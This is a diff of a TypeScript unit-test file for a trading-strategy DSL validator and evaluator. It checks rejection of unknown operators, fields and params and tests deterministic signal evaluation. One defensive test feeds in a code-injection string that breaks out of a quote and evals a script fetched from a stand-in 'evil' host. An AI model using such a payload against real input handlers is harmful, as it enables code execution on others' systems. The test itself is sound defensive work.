@@ -1,9 +1,10 @@
-// FULL — unit tests for the DSL whitelist validator. Run: npm test
-import { describe, it, expect } from 'vitest';
+import { describe, expect, it } from 'vitest';
+import { evaluateDSL } from './evaluator';
+import { STRATEGY_DSL_VERSION, type StrategyDSL } from './schema';
 import { validateDSL } from './validator';
-import type { StrategyDSL } from './schema';
 
 const good: StrategyDSL = {
+  version: STRATEGY_DSL_VERSION,
   name: 'EMA cross + RSI filter',
   params: {
     emaFast: { type: 'int', min: 2, max: 50, default: 12 },
@@ -17,7 +18,7 @@ const good: StrategyDSL = {
         { ind: 'EMA', src: 'CLOSE', len: '$emaFast' },
         { ind: 'EMA', src: 'CLOSE', len: '$emaSlow' },
       ] },
-      { op: 'LT', args: [{ ind: 'RSI', len: 14 }, { op: 'CONST', v: '$rsiBuy' }] },
+      { op: 'LT', args: [{ ind: 'RSI', src: 'CLOSE', len: 14 }, { op: 'CONST', v: '$rsiBuy' }] },
     ],
   },
   exit: {
@@ -29,60 +30,93 @@ const good: StrategyDSL = {
   },
 };
 
-describe('validateDSL — accepts valid', () => {
-  it('passes a well-formed strategy', () => {
-    const r = validateDSL(good);
-    expect(r.ok).toBe(true);
-    expect(r.errors).toEqual([]);
-  });
-});
-
-describe('validateDSL — rejects unsafe / malformed', () => {
-  it('rejects unknown operator', () => {
-    const bad = structuredClone(good);
-    (bad.entry as { op: string }).op = 'EXEC';
-    expect(validateDSL(bad).ok).toBe(false);
+describe('validateDSL', () => {
+  it('accepts a well-formed, typed strategy', () => {
+    const result = validateDSL(good);
+    expect(result.ok).toBe(true);
+    expect(result.errors).toEqual([]);
+    expect(result.maxLookbackBars).toBe(51);
   });
 
-  it('rejects unknown indicator', () => {
-    const bad = structuredClone(good);
-    (bad.exit as { args: { ind: string }[] }).args[0].ind = 'BACKDOOR';
-    expect(validateDSL(bad).ok).toBe(false);
+  it('rejects unknown operators, indicators, fields, and params', () => {
+    const operator = structuredClone(good);
+    (operator.entry as { op: string }).op = 'EXEC';
+    expect(validateDSL(operator).ok).toBe(false);
+
+    const indicator = structuredClone(good) as unknown as Record<string, unknown>;
+    indicator.entry = { op: 'GT', args: [{ ind: 'MACD', src: 'CLOSE', len: 12 }, { op: 'CONST', v: 0 }] };
+    expect(validateDSL(indicator).errors.some((error) => error.includes('not executable'))).toBe(true);
+
+    const field = structuredClone(good) as unknown as Record<string, unknown>;
+    (field.entry as Record<string, unknown>).danger = true;
+    expect(validateDSL(field).ok).toBe(false);
+
+    const reference = structuredClone(good);
+    (reference.entry as { args: { args: { len: string }[] }[] }).args[0].args[0].len = '$missing';
+    expect(validateDSL(reference).errors.some((error) => error.includes('unknown param'))).toBe(true);
   });
 
-  it('rejects code-injection strings', () => {
-    const bad = { ...good, name: "x'); eval(fetch('//evil'))" };
-    const r = validateDSL(bad);
-    expect(r.ok).toBe(false);
-    expect(r.errors.some((e) => e.includes('suspicious'))).toBe(true);
-  });
-
-  it('rejects an unknown $param reference', () => {
-    const bad = structuredClone(good);
-    (bad.entry as { args: { args: { len: string }[] }[] }).args[0].args[0].len = '$doesNotExist';
-    expect(validateDSL(bad).ok).toBe(false);
-  });
-
-  it('rejects len out of range', () => {
+  it('rejects code-like strings and out-of-range lookbacks', () => {
+    expect(validateDSL({ ...good, name: "x'); eval(fetch('//evil'))" }).errors.some((error) => error.includes('suspicious'))).toBe(true);
     const bad = structuredClone(good);
     (bad.exit as { args: { len: number }[] }).args[0].len = 9999;
     expect(validateDSL(bad).ok).toBe(false);
   });
 
-  it('rejects unknown fields', () => {
-    const bad = structuredClone(good) as unknown as Record<string, unknown>;
-    (bad.entry as Record<string, unknown>).danger = true;
-    expect(validateDSL(bad).ok).toBe(false);
-  });
-
-  it('enforces max node count', () => {
-    const r = validateDSL(good, { maxDepth: 8, maxNodes: 3, minLen: 2, maxLen: 400, maxConstAbs: 1e9 });
-    expect(r.ok).toBe(false);
+  it('enforces depth/node limits, exact arity, and expression types', () => {
+    expect(validateDSL(good, { maxDepth: 8, maxNodes: 3, minLen: 2, maxLen: 400, maxConstAbs: 1e9 }).ok).toBe(false);
+    const bad = structuredClone(good);
+    bad.entry = { op: 'AND', args: [{ ind: 'CLOSE' }, { op: 'CONST', v: 1 }] };
+    const result = validateDSL(bad);
+    expect(result.errors).toContain('entry.args[0]: expected boolean, received number');
+    expect(result.errors).toContain('entry.args[1]: expected boolean, received number');
   });
 
   it('rejects a non-boolean root', () => {
     const bad = structuredClone(good);
-    bad.entry = { ind: 'CLOSE' } as never;
-    expect(validateDSL(bad).ok).toBe(false);
+    bad.entry = { ind: 'CLOSE' };
+    expect(validateDSL(bad).errors).toContain('entry: root must return boolean');
+  });
+});
+
+describe('evaluateDSL', () => {
+  it('evaluates parameterized cross trees deterministically', () => {
+    const candles = [1, 2, 3, 2, 1, 2, 3, 4].map((close, index) => ({
+      t: index * 60_000,
+      o: close,
+      h: close + 0.5,
+      l: close - 0.5,
+      c: close,
+      v: 100 + index,
+    }));
+    const dsl: StrategyDSL = {
+      version: STRATEGY_DSL_VERSION,
+      name: 'SMA cross',
+      params: { fast: 2, slow: { type: 'int', min: 3, max: 10, default: 3 } },
+      entry: {
+        op: 'CROSS_UP',
+        args: [
+          { ind: 'SMA', src: 'CLOSE', len: '$fast' },
+          { ind: 'SMA', src: 'CLOSE', len: '$slow' },
+        ],
+      },
+      exit: {
+        op: 'CROSS_DOWN',
+        args: [
+          { ind: 'SMA', src: 'CLOSE', len: '$fast' },
+          { ind: 'SMA', src: 'CLOSE', len: '$slow' },
+        ],
+      },
+    };
+    const first = evaluateDSL(candles, dsl);
+    expect(first).toEqual(evaluateDSL(candles, dsl));
+    expect(first.signals.entry).toEqual([false, false, false, false, false, false, true, false]);
+    expect(first.signals.exit).toEqual([false, false, false, false, true, false, false, false]);
+    expect(first.maxLookbackBars).toBe(4);
+  });
+
+  it('refuses evaluation when validation fails', () => {
+    const invalid = { ...good, entry: { op: 'DIV', args: [{ ind: 'CLOSE' }, { op: 'CONST', v: 0 }] } };
+    expect(() => evaluateDSL([], invalid)).toThrow(/root must return boolean/);
   });
 });
